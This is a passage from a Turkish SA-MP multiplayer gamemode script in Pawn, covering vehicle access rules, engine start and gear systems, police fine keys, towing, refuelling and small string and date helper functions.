			if (APlayerData[playerid][PlayerClass] != ClassFire)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleFiretruck:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Itfaiyeci Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
		}
	}

	// Þirket Sistemi
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    if(ArabaSirket[ GetPlayerVehicleID(playerid) ] != -1 && SirketAraba[ ArabaSirket[ GetPlayerVehicleID(playerid) ] ][SASirketID] != Sirket[playerid] && APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0)
	    {
			RemovePlayerFromVehicle(playerid);
			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Baþka þirketin aracýna binemezsiniz!");
		}

	    if(ArabaSirket[ GetPlayerVehicleID(playerid) ] != -1 && SirketAraba[ ArabaSirket[ GetPlayerVehicleID(playerid) ] ][SASirketID] == Sirket[playerid] && APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0)
	    {
	        if(SirketRutbe[playerid] < SirketAraba[ ArabaSirket[ GetPlayerVehicleID(playerid) ] ][SAMinRutbe])
	        {
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lideriniz bu þirket aracýna binmenize izin vermiyor!");
			}
		}
	}
	return 1;
}

forward PlayerCTGear(playerid);
public PlayerCTGear(playerid)
{
	PlayerCGear[playerid] = 1;
}
forward PlayerCDTGear(playerid);
public PlayerCDTGear(playerid)
{
	PlayerCDGear[playerid] = 1;
}
forward Addnos(playerid);
public Addnos(playerid)
{
	RemoveVehicleComponent(GetPlayerVehicleID(playerid),1010);
}

IsVehiclePlane(vehicleid)
{
	switch(GetVehicleModel(vehicleid)) {
 		case 592, 577, 511, 512, 593, 520, 553, 476, 519, 460, 513, 548, 425, 417, 487, 488, 497, 563, 447, 469: return 1;
	}
	return 0;
}

// This callback gets called whenever a player presses a key
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
        
	// Sinyal sistemi



  if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
  {

	  new veh = GetPlayerVehicleID(playerid);
	  new Float:health;
	  GetVehicleHealth(veh, health);
	  new engine, lights, alarm, doors, bonnet, boot, objective;
	  
        if(GetPlayerVehicleSeat(playerid) == 0)
        {
            #if BLINK_ALLOW_EMERGENCY == 1
            if(newkeys == KEY_LOOK_BEHIND)
            {
                if(!IsCarBlinking(veh)) SetCarBlinking(veh, 2), SetPVarInt(playerid, "blink-car", veh);
    		    else DisableCarBlinking(veh);
            }
            #endif
        	if(newkeys == KEY_LOOK_LEFT)
            {
    			if(!IsCarBlinking(veh)) SetCarBlinking(veh, 0), SetPVarInt(playerid, "blink-car", veh);
    		    else DisableCarBlinking(veh);
        	}
        	else if(newkeys == KEY_LOOK_RIGHT)
            {
    		    if(!IsCarBlinking(veh)) SetCarBlinking(veh, 1), SetPVarInt(playerid, "blink-car", veh);
    		    else DisableCarBlinking(veh);
        	}

            if(IsCarBlinking(veh))
            {
                new Float:a, Float:b = BlinkR[veh];
                GetVehicleZAngle(veh, a);

                if(BlinkSide[veh] == 0)
                {
                    b+=BLINK_TURN_ANGLE;
                    if(b > 360.0) b -=360.0;
                    if(a < b-180) a = a+360;
                	if(b < a-180) b = b+360;

                    if(a > b) DisableCarBlinking(veh);
                }
                else if(BlinkSide[veh] == 1)
                {
                    b-=BLINK_TURN_ANGLE;
                    if(b < 0.0) b = 360.0 + b;
                    if(a < b-180) a = a+360;
                	if(b < a-180) b = b+360;

                    if(a < b) DisableCarBlinking(veh);
                }
            }
        }
  if(newkeys == KEY_NO)
  {
		if(MotorMOD[veh] == 0)
		{
              if(health <= 300)
              {
                SendClientMessage(playerid, COLOR_CYAN,"{FFCC00}» {FFFFFF}Araç kullanýlmaz halde!");
              }
			  if (AVehicleData[veh][Fuel] == 0)
			  {
			     SendClientMessage(playerid, COLOR_CYAN,"{FFCC00}» {FFFFFF}Aracýn benzini olmadýðýndan dolayý çalýþtýrýlamadý!");
			  }else
			    if(health <= 1000 && health > 600)
				{
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}motor çalýþmýþtýr -{FFCC00} %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 1;
			    }
			   if(health < 600 && health > 500)
				{
				    new rand = random(4);
						    if(rand == 3)
						    {
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}otor çalýþmýþtýr -{FFCC00} %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
							MotorMOD[veh] = 1;
			                }
			                if(rand == 1)
			                {
			  			    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}motor çalýþmamýþtýr -{FFCC00} %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
			                }
			    }
			    if(health < 500 && health > 300)
				{
				    new rand = random(2);
						    if(rand == 0)
						    {
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}Motor çalýþmýþtýr -{FFCC00} %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 1;
			                }
			                if(rand == 1)
			                {
			  			    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}motor çalýþmamýþtýr -{FFCC00} %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
			                }
			    }
		}else{
		    				GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}motor kapatýlmýþtýr -{FFCC00} %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
		}
 }
 }

   // Karavan Sistemi
	KaravanKeys(playerid, newkeys, oldkeys);
	// TMMobile Sistemi
	if(newkeys == KEY_YES)
	{
	    TMM_APP[playerid] = APP_Home;
	    ShowTMMobile(playerid);
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Akýllý telefonunuzu kapatmak için ' {FFCC00}ESC{FFFFFF} ' tuþuna basýn.");
	}

//    new Float:objX, Float:objY, Float:objZ, Float:objRX, Float:objRY, Float:objRZ;

	// Sedatt Mekan
/*	if(newkeys == KEY_NO)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2886.735839, -351.673370, 7.967061))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoIcKapi[0], objX, objY, objZ);
				GetDynamicObjectRot(SedoIcKapi[0], objRX, objRY, objRZ);
				if(objRZ == 90.0) MoveDynamicObject(SedoIcKapi[0], objX, objY, objZ, 2.0, objRX, objRY, objRZ+90.0);
				if(objRZ == 180.0) MoveDynamicObject(SedoIcKapi[0], objX, objY, objZ, 2.0, objRX, objRY, objRZ-90.0);
			}
	    }

	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2906.320800, -351.673370, 7.967061))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoIcKapi[1], objX, objY, objZ);
				GetDynamicObjectRot(SedoIcKapi[1], objRX, objRY, objRZ);
				if(objRZ == 90.0) MoveDynamicObject(SedoIcKapi[1], objX, objY, objZ, 2.0, objRX, objRY, objRZ-90.0);
				if(objRZ == 0.0) MoveDynamicObject(SedoIcKapi[1], objX, objY, objZ, 2.0, objRX, objRY, objRZ+90.0);
			}
	    }

	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2875.022460, -310.246459, 9.937064))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoGarajKapi[0], objX, objY, objZ);
				GetDynamicObjectRot(SedoGarajKapi[0], objRX, objRY, objRZ);
				if(objRX == 0.0) MoveDynamicObject(SedoGarajKapi[0], objX, objY, objZ, 2.0, objRX-90.0, objRY, objRZ);
				if(objRX == -90.0) MoveDynamicObject(SedoGarajKapi[0], objX, objY, objZ, 2.0, objRX+90.0, objRY, objRZ);
			}
	    }

	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2884.006591, -310.246459, 9.937064))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoGarajKapi[1], objX, objY, objZ);
				GetDynamicObjectRot(SedoGarajKapi[1], objRX, objRY, objRZ);
				if(objRX == 0.0) MoveDynamicObject(SedoGarajKapi[1], objX, objY, objZ, 2.0, objRX-90.0, objRY, objRZ);
				if(objRX == -90.0) MoveDynamicObject(SedoGarajKapi[1], objX, objY, objZ, 2.0, objRX+90.0, objRY, objRZ);
			}
	    }

	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2893.017822, -310.246459, 9.937064))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoGarajKapi[2], objX, objY, objZ);
				GetDynamicObjectRot(SedoGarajKapi[2], objRX, objRY, objRZ);
				if(objRX == 0.0) MoveDynamicObject(SedoGarajKapi[2], objX, objY, objZ, 2.0, objRX-90.0, objRY, objRZ);
				if(objRX == -90.0) MoveDynamicObject(SedoGarajKapi[2], objX, objY, objZ, 2.0, objRX+90.0, objRY, objRZ);
			}
	    }

	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2901.998535, -310.246459, 9.937064))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoGarajKapi[3], objX, objY, objZ);
				GetDynamicObjectRot(SedoGarajKapi[3], objRX, objRY, objRZ);
				if(objRX == 0.0) MoveDynamicObject(SedoGarajKapi[3], objX, objY, objZ, 2.0, objRX-90.0, objRY, objRZ);
				if(objRX == -90.0) MoveDynamicObject(SedoGarajKapi[3], objX, objY, objZ, 2.0, objRX+90.0, objRY, objRZ);
			}
	    }

	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2865.932373, -350.776275, 9.467059))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoDisKapi[0], objX, objY, objZ);
				GetDynamicObjectRot(SedoDisKapi[0], objRX, objRY, objRZ);
				if(objZ == 9.467059) MoveDynamicObject(SedoDisKapi[0], objX, objY, objZ-10.0, 5.0, objRX, objRY, objRZ);
				if(objZ == (9.467059-10.0)) MoveDynamicObject(SedoDisKapi[0], objX, objY, objZ+10.0, 2.0, objRX, objRY, objRZ);
			}else{
			    OynakDisKapi[playerid] = 1;
			    ShowPlayerDialog(playerid, DialogOynakDisKapi, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Sedatt &  Malikanesi", "{F8F8FF}Malikane dýþ kapýsýnýn þifresini giriniz:", "Gir", "Kapat");
			}
	    }

	    if(IsPlayerInRangeOfPoint(playerid, 5.0, 2915.898681, -350.776275, 9.467059))
	    {
			if(!strcmp("Reiss_Umut", GetName(playerid), true) || !strcmp("EvoturK", GetName(playerid), true))
			{
 				GetDynamicObjectPos(SedoDisKapi[1], objX, objY, objZ);
				GetDynamicObjectRot(SedoDisKapi[1], objRX, objRY, objRZ);
				if(objZ == 9.467059) MoveDynamicObject(SedoDisKapi[1], objX, objY, objZ-10.0, 5.0, objRX, objRY, objRZ);
				if(objZ == (9.467059-10.0)) MoveDynamicObject(SedoDisKapi[1], objX, objY, objZ+10.0, 2.0, objRX, objRY, objRZ);
			}else{
			    OynakDisKapi[playerid] = 2;
			    ShowPlayerDialog(playerid, DialogOynakDisKapi, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Sedatt &  Malikanesi", "{F8F8FF}Malikane dýþ kapýsýnýn þifresini giriniz:", "Gir", "Kapat");
			}
	    }
	}
*/
	//vites sistemi
 	if(otovites[playerid] == 0)
 	{
		if (newkeys & KEY_ANALOG_UP)
		{
			if (IsPlayerInAnyVehicle(playerid) && !IsVehiclePlane(GetPlayerVehicleID(playerid)))
			{
			    new vehicleid;
				vehicleid = GetPlayerVehicleID(playerid);
			    if (PlayerGear[playerid] == 5 || IsVehicleDrivingBackwards(vehicleid) || PlayerCGear[playerid] == 0)
				{
					SendClientMessage(playerid, COLOR_RED, "{FFCC00}» {FFFFFF}Henuz Vites Degistiremezsiniz");
					return 1;
				}
			    else if (PlayerGear[playerid] == 1)
				{
				    PlayerCGear[playerid] = 0;
				    SetTimerEx("PlayerCTGear", TCangear, false, "i", playerid);
					PlayerGear[playerid]++;

					return 1;
				}
	   			else if (PlayerGear[playerid] == 2)
				{
				    PlayerCGear[playerid] = 0;
				    SetTimerEx("PlayerCTGear", TCangear, false, "i", playerid);
					PlayerGear[playerid]++;
					return 1;
				}
	   			else if (PlayerGear[playerid] == 3)
				{
				    PlayerCGear[playerid] = 0;
				    SetTimerEx("PlayerCTGear", TCangear, false, "i", playerid);
					PlayerGear[playerid]++;
					return 1;
				}
	   			else if (PlayerGear[playerid] == 4)
				{
				    PlayerCGear[playerid] = 0;
					SetTimerEx("PlayerCTGear", TCangear, false, "i", playerid);
					PlayerGear[playerid]++;
	                AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
					SetTimerEx("Addnos", 2000, false, "i", playerid);
					return 1;
				}
			}
		}
		if (newkeys & KEY_ANALOG_DOWN)
		{

			if (IsPlayerInAnyVehicle(playerid) && !IsVehiclePlane(GetPlayerVehicleID(playerid)))
			{
				new vehicleid;
				vehicleid = GetPlayerVehicleID(playerid);
				if (PlayerGear[playerid] == 1 || IsVehicleDrivingBackwards(vehicleid) || PlayerCDGear[playerid] == 0)
				{
					SendClientMessage(playerid, COLOR_INDIGO, "{FFCC00}» {FFFFFF}Henuz Vites Degistiremezsiniz");
					return 1;
				}
			    else if (PlayerGear[playerid] == 2)
				{

				    SetTimerEx("PlayerCDTGear", TDCangear, false, "i", playerid);
				    PlayerCDGear[playerid] = 0;
					PlayerGear[playerid]--;
					return 1;
				}
	   			else if (PlayerGear[playerid] == 3)
				{
				    SetTimerEx("PlayerCDTGear", TDCangear, false, "i", playerid);
				    PlayerCDGear[playerid] = 0;
					PlayerGear[playerid]--;
	                return 1;
				}
				else if (PlayerGear[playerid] == 4)
				{

				    SetTimerEx("PlayerCDTGear", TDCangear, false, "i", playerid);
				    PlayerCDGear[playerid] = 0;
					PlayerGear[playerid]--;
	                return 1;
				}
				else if (PlayerGear[playerid] == 5)
				{
				    SetTimerEx("PlayerCDTGear", TDCangear, false, "i", playerid);
				    PlayerCDGear[playerid] = 0;
					PlayerGear[playerid]--;
	                return 1;
				}

			}
		}
	}


	// Debug the keypresses
//	DebugKeys(playerid, newkeys, oldkeys);

	// ****************************************************************************************
	// NOTE: the keys are messed up, so the code may look strange when testing for certain keys
	// ****************************************************************************************

	// Fining and jailing players when you're police and press the correct keys
	// Check the class of the player

	if(APlayerData[playerid][PlayerClass] != ClassPolice)
	{
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER && newkeys & KEY_CROUCH)
	 	{
			if(IsPlayerInVehicle(playerid,GetPlayerVehicleID(playerid)))
	  		{
	   			new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
		 		SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 0, alarm, doors, bonnet, boot, objective);
/*
	  		    if(Sellektor[playerid] == 0)
	  		    {
	  		    new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
		 		SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 1, alarm, doors, bonnet, boot, objective);
				Sellektor[playerid] = 1;
	   			}
	   			else
	   			{
	   			new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
		 		SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 0, alarm, doors, bonnet, boot, objective);
				 Sellektor[playerid] = 0;
	   			}
*/
	  		}
	 	}
 	}

	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassPolice:
		{
		    // If the police-player pressed the RMB key (AIM key) when OUTSIDE his vehicle
			if (((newkeys & KEY_HANDBRAKE) && !(oldkeys & KEY_HANDBRAKE)) && (GetPlayerVehicleID(playerid) == 0))
				Police_FineNearbyPlayers(playerid);

		    // If the police-player pressed the LCTRL (SECUNDAIRY key) key when INSIDE his vehicle
			if (((newkeys & KEY_ACTION) && !(oldkeys & KEY_ACTION)) && (GetPlayerVehicleID(playerid) != 0))
				Police_WarnNearbyPlayers(playerid);
		}
		case ClassFBY:
		{
		    // If the police-player pressed the RMB key (AIM key) when OUTSIDE his vehicle
			if (((newkeys & KEY_HANDBRAKE) && !(oldkeys & KEY_HANDBRAKE)) && (GetPlayerVehicleID(playerid) == 0))
				FBY_FineNearbyPlayers(playerid);

		    // If the FBY-player pressed the LCTRL (SECUNDAIRY key) key when INSIDE his vehicle
			if (((newkeys & KEY_ACTION) && !(oldkeys & KEY_ACTION)) && (GetPlayerVehicleID(playerid) != 0))
				FBY_WarnNearbyPlayers(playerid);
		}
	}

	// Trying to attach the closest vehicle to the towtruck when the player pressed FIRE when inside a towtruck
	// Check if the player is inside a towtruck
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleTowTruck && APlayerData[playerid][PlayerClass] == ClassRoadWorker)
	{
		// Check if the player pushed the fire-key
		if(newkeys & KEY_FIRE)
		{
			// Get the vehicle-id of the closest vehicle
			new closest = GetClosestVehicle(playerid);
			if(VehicleToPlayer(playerid, closest) < 10)
			{
				if(TowOK[playerid] == 1)
				{
                DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
                TowOK[playerid] = 0;
				}
				else
				{
				AttachTrailerToVehicle(closest, GetPlayerVehicleID(playerid)); // Attach the vehicle to the towtruck
				TowOK[playerid] = 1;
				}
			}
		}
	}

	// Refuel a vehicle when driving a vehicle and pressing the HORN key
	// Check if the player presses the HORN key
	if ((newkeys & KEY_CROUCH) && !(oldkeys & KEY_CROUCH))
	{
		// Check if the player is driving a vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Loop through all ARefuelPickups
			for (new i; i < sizeof(ARefuelPickups); i++)
			{
				// Check if the player is in range of a refuelpickup
				if(IsPlayerInRangeOfPoint(playerid, 2.5, ARefuelPickups[i][pux], ARefuelPickups[i][puy], ARefuelPickups[i][puz]))
				{
					// Show a message that the player's vehicle is refuelling
					GameTextForPlayer(playerid, TXT_Refuelling, 3000, 4);
					// Don't allow the player to move again (the timer will allow it after refuelling)
					TogglePlayerControllable(playerid, 0);
				       // Start a timer (let the player wait until the vehicle is refuelled)
				    SetTimerEx("RefuelVehicle", 5000, false, "i", playerid);
				    // Stop the search
					break;
				}
			}
		}
	}

	// Þirket Sistemi
	SirketKeys(playerid, newkeys, oldkeys);

	// VIP Sistemi
	if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
	{
  		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && newkeys & KEY_FIRE)
   		{
			AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
   		}else if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && oldkeys & KEY_FIRE)
   		{
			AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
   		}
	}


	return 1;
}



forward VehicleToPlayer(playerid,vehicleid);
// Get the distance between the vehicle and the player
public VehicleToPlayer(playerid, vehicleid)
{
	// Setup local variables
	new Float:pX, Float:pY, Float:pZ, Float:cX, Float:cY, Float:cZ, Float:distance;
	// Get the player position
	GetPlayerPos(playerid, pX, pY, pZ);
	// Get the vehicle position
	GetVehiclePos(vehicleid, cX, cY, cZ);
	// Calculate the distance
	distance = floatsqroot(floatpower(floatabs(floatsub(cX, pX)), 2) + floatpower(floatabs(floatsub(cY, pY)), 2) + floatpower(floatabs(floatsub(cZ, pZ)), 2));
	// Return the distance to the calling routine
	return floatround(distance);
}



forward GetClosestVehicle(playerid);
// Find the vehicle closest to the player
public GetClosestVehicle(playerid)
{
	// Setup local variables
	new Float:distance = 99999.000+1, Float:distance2, result = -1;
	// Loop through all vehicles
	for(new i = 0; i < MAX_VEHICLES; i++)
	{
		// First check if the player isn't driving the current vehicle that needs to be checked for it's distance to the player
		if (GetPlayerVehicleID(playerid) != i)
		{
			// Get the distance between player and vehicle
			distance2 = VehicleToPlayer(playerid, i);
			// Check if the distance is smaller than the previous distance
			if(distance2 < distance)
			{
				// Store the distance
				distance = distance2;
				// Store the vehicle-id
				result = i;
			}
		}
	}

	// Return the vehicle-id of the closest vehicle
	return result;
}



// This function is used to debug the key-presses
stock DebugKeys(playerid, newkeys, oldkeys)
{
	// Debug keys
	if ((newkeys & KEY_FIRE) && !(oldkeys & KEY_FIRE))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_FIRE key");
	if ((newkeys & KEY_ACTION) && !(oldkeys & KEY_ACTION))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_ACTION key");
	if ((newkeys & KEY_CROUCH) && !(oldkeys & KEY_CROUCH))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_CROUCH key");
	if ((newkeys & KEY_SPRINT) && !(oldkeys & KEY_SPRINT))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_SPRINT key");
	if ((newkeys & KEY_SECONDARY_ATTACK) && !(oldkeys & KEY_SECONDARY_ATTACK))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_SECONDARY_ATTACK key");
	if ((newkeys & KEY_JUMP) && !(oldkeys & KEY_JUMP))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_JUMP key");
	if ((newkeys & KEY_LOOK_RIGHT) && !(oldkeys & KEY_LOOK_RIGHT))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_LOOK_RIGHT key");
	if ((newkeys & KEY_HANDBRAKE) && !(oldkeys & KEY_HANDBRAKE))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_HANDBRAKE key");
	if ((newkeys & KEY_LOOK_LEFT) && !(oldkeys & KEY_LOOK_LEFT))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_LOOK_LEFT key");
	if ((newkeys & KEY_SUBMISSION) && !(oldkeys & KEY_SUBMISSION))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_SUBMISSION key");
	if ((newkeys & KEY_LOOK_BEHIND) && !(oldkeys & KEY_LOOK_BEHIND))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_LOOK_BEHIND key");
	if ((newkeys & KEY_WALK) && !(oldkeys & KEY_WALK))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_WALK key");
	if ((newkeys & KEY_ANALOG_UP) && !(oldkeys & KEY_ANALOG_UP))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_ANALOG_UP key");
	if ((newkeys & KEY_ANALOG_DOWN) && !(oldkeys & KEY_ANALOG_DOWN))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_ANALOG_DOWN key");
	if ((newkeys & KEY_ANALOG_LEFT) && !(oldkeys & KEY_ANALOG_LEFT))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_ANALOG_LEFT key");
	if ((newkeys & KEY_ANALOG_RIGHT) && !(oldkeys & KEY_ANALOG_RIGHT))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_ANALOG_RIGHT key");
	if ((newkeys & KEY_UP) && !(oldkeys & KEY_UP))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_UP key");
	if ((newkeys & KEY_DOWN) && !(oldkeys & KEY_DOWN))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_DOWN key");
	if ((newkeys & KEY_LEFT) && !(oldkeys & KEY_LEFT))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_LEFT key");
	if ((newkeys & KEY_RIGHT) && !(oldkeys & KEY_RIGHT))
		SendClientMessage(playerid, 0x0000FFFF, "You pressed the KEY_RIGHT key");

	return 1;
}


// Þirket Sistemi [EvoturK]
GetName(playerid)
{
	new n[MAX_PLAYER_NAME];
	GetPlayerName(playerid, n, MAX_PLAYER_NAME);
	return n;
}


GetIP2(playerid)
{
	new n[40];
	GetPlayerIp(playerid, n, 40);
	return n;
}

Float:floatmin(Float:float1, Float:float2)
{
	if(float1 > float2) return float2;
	return float1;
}

Float:floatmax(Float:float1, Float:float2)
{
	if(float1 < float2) return float2;
	return float1;
}

stock strtok(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

stock strrest(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}
	new offset = index;
	new result[128];
	while ((index < length) && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

GunEkle(gun, day, month, year)
{
	day += gun;
	AyKontrol(day, month, year);

	new Tarih[20];
	format(Tarih, 20, "%d.%d.%d", day, month, year);
	return Tarih;
}

AyKontrol(&day, &month, &year)
{
	switch(month)
	{
	    case 1, 3, 5, 7, 8, 10, 12:
	    {
	        if(day > 31)
	        {
	            day -= 31;
	            month++;
	            YilKontrol(month, year);
	        }else{
	            return 1;
	        }
	    }

	    case 4, 6, 9, 11:
	    {
	        if(day > 30)
	        {
				day -= 30;
				month++;
				YilKontrol(month, year);
	        }else{
	            return 1;
	        }
 		}

 		case 2:
 		{
 		    if(year % 4 == 0 && day > 29)
 		    {
 		        day -= 29;
 		        month++;
 		        YilKontrol(month, year);
			}else if(year % 4 != 0 && day > 28)
			{
			    day -= 28;
			    month++;
			    YilKontrol(month, year);
			}else{
	            return 1;
	        }
   		}
	}

	AyKontrol(day, month, year);
	return 1;
}

YilKontrol(&month, &year)
{
	if(month > 12)
	{
		new artanay = month % 12;
	    year += (month-artanay)/12;
	    month = artanay;
	}
}


split(const strsrc[], strdest[][], delimiter)
{
	new i, li,aNum,len;
	while(i <= strlen(strsrc))
	{
	    if(strsrc[i]==delimiter || i==strlen(strsrc))
		{
	        len = strmid(strdest[aNum], strsrc, li, i, 128);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return aNum;
}

